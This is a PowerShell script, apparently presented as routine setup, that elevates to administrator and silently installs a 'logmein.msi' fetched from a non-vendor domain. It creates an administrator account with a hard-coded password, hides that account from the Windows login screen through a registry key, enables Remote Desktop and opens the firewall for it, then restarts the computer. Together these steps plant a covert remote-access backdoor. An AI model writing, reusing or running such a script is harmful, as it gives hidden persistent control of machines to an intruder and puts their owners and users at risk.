#################### Configuration #######################

# URL of the software to download from
$LOGMEIN_DOWNLOAD_URL = "https://armadyne.systems/logmein.msi"

# Path in which the installation file will be stored. 
# (This default value is the Downloads folder of the user profile)
$LOGMEIN_INSTALLATION_FILE = "$env:USERPROFILE\Downloads\logmein.msi"

# Username and password of the local user to create
$USER = "sys_admin"
$PASS = "P@ssw0rd!!"


#########################################################

Function AddLog ($MSG) 
{
    $DATE=Get-Date -Format "yyyy-MM-dd hh:mm"   
    Write-Host "$DATE - $MSG"
}


################## Elevate permissions in case of needed

if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
        $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
    }
}

############### Install LogMe In

AddLog "Downloading `"$LOGMEIN_DOWNLOAD_URL`" to $LOGMEIN_INSTALLATION_FILE"
Invoke-WebRequest -Uri $LOGMEIN_DOWNLOAD_URL -OutFile $LOGMEIN_INSTALLATION_FILE

If (Test-Path $LOGMEIN_INSTALLATION_FILE)
{

    AddLog "Found installation file $LOGMEIN_INSTALLATION_FILE"
    AddLog "Launched installation in background (wait for a few minutes after finishing the script)..."
       
    # Launches the exe file in unattended mode
    Start-Process -FilePath "msiexec" -ArgumentList "/i $LOGMEIN_INSTALLATION_FILE /qn" -Wait | Out-Null

    AddLog "Finished"
}
Else
{
    AddLog "Cannot install. NOT found installation file $LOGMEIN_INSTALLATION_FILE"
}


############# Create User

$PASS_SECURE = ConvertTo-SecureString "$PASS" -AsPlainText -Force

AddLog "Creating user $USER and enabling it for RDP..."
try {
    New-LocalUser "$USER" -Password $PASS_SECURE -FullName "$USER" -Description "" -ErrorAction Stop | Out-Null
    Add-LocalGroupMember -Group "Administrators" -Member "$USER" -ErrorAction Stop | Out-Null
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $USER -ErrorAction Stop | Out-Null
}
catch {
    AddLog "Error creating $USER user ($_)"
}

################# Hide user from login page

$REGISTRY_KEY_PATH = "HKLM:\\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
$REGISTRY_KEY_NAME = "UserList"

AddLog "Hiding user $USER from login page..."
try {
    New-Item -Path $REGISTRY_KEY_PATH -Name $REGISTRY_KEY_NAME -Force -ErrorAction Stop | Out-Null
}
catch {
    AddLog "Error creating registry path `"$REGISTRY_KEY_PATH`" ($_)"
}

try {
    New-ItemProperty -Path "$REGISTRY_KEY_PATH\$REGISTRY_KEY_NAME" -Name "$USER" -Value "0"  -PropertyType "DWORD" -ErrorAction Stop | Out-Null
}
catch {
    AddLog "Error creating `"$USER`" entry in the SpecialAccounts registry key ($_)"
}


############### Enable RDP for user

AddLog "Enabling RDP..."
try {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0 -ErrorAction Stop  | Out-Null
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction Stop  | Out-Null
}
catch
{
    AddLog "Error enabling RDP ($_)"
}

AddLog "Restarting computer in 5 seconds..."
Start-Sleep 5
Restart-Computer
